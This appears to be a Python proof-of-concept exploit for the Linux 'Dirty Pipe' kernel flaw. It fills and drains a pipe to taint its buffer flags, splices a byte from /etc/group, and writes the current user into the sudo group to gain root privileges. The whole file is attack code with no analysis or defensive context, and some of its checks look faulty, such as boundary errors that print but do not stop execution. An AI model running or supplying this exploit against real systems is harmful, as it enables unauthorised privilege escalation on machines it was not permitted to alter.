import getpass
import os
import sys

# kernel page size
PAGE = 4096
# linux pipe buffers are 64K
PIPESIZE = 65536


def backup_groups_file():
    """Back up just for working on the POC"""
    with open("/etc/group", "r") as group:
        with open("/tmp/group_backup", "w") as backup:
            data = group.read()
            backup.write(data)


def contaminate_flags_of_pipe(read: int, write: int) -> None:
    """Contaminate the pipe flags, merge with splice, add our name into the sudo group."""
    data = b'a' * PIPESIZE

    written = os.write(write, data)
    print(f"[*] {written} bytes written to pipe")

    data = os.read(read, PIPESIZE)
    print(f"[*] {len(data)} bytes read from pipe")


def find_offset_of_sudo() -> None:
    """We are going to find the sudo entry in /etc/group
       and add our username to it."""
    file_offset = 0
    found_sudo = False
    sudo_not_last = False
    with open('/etc/group', 'r') as groups:
        for line in groups.readlines():
            file_offset += len(line)
            if line.split(":")[0] == "sudo":
                print("[*] Found sudo group offset")
                found_sudo = True

            if found_sudo:
                print("[*] Confirmed it is not last.")
                sudo_not_last = True
                break

    if sudo_not_last:
        return file_offset
    else:
        print(
            "[x] Can't run exploit as adding sudo priviledges would require enlarging /etc/group")
        sys.exit(-1)


def run_poc(name: str, file_offset: int) -> None:
    """Open our groups file, contaminate the pipe buff, call splice, write into /etc/group"""
    print("[*] Opening /etc/group")
    grps = os.open("/etc/group", os.O_RDONLY)

    print("[*] Opening PIPE")
    (r, w) = os.pipe()

    print("[*] Contaminating flags of pipe buffer")
    contaminate_flags_of_pipe(r, w)

    print("[*] Splicing byte from /etc/group to pipe")
    n = os.splice(
        grps,  # group file input
        w,    # output to our pipe
        1,    # length of 1
        offset_src=file_offset-2  # from this offset
    )
    print(f"[*] Spliced {n} bytes")

    print(f"[*] Altering group to add {name}")
    n = os.write(w, bytes(f",{name}\n", "utf-8"))

    print(f"[*] {n} bytes written to /etc/group")
    sys.exit(0)


if __name__ == "__main__":
    print("[*] Dirty PIPE POC [*]")
    backup_groups_file()

    name = getpass.getuser()
    print(f"[*] Exploit will add {name} to sudoers")

    print("[*] Finding offset of sudo entry in /etc/group")
    file_offset = find_offset_of_sudo()

    # ensure that we are not at a page boundary
    if file_offset % PAGE == 0:
        print(
            f"[x] Can not exploit start of page boundary with offset {file_offset}")

    if (file_offset | PAGE-1) + 1 < (file_offset + len(name)):
        print(
            f"[x] Can not perform exploit across page boundary with offset {file_offset}")

    run_poc(name, file_offset)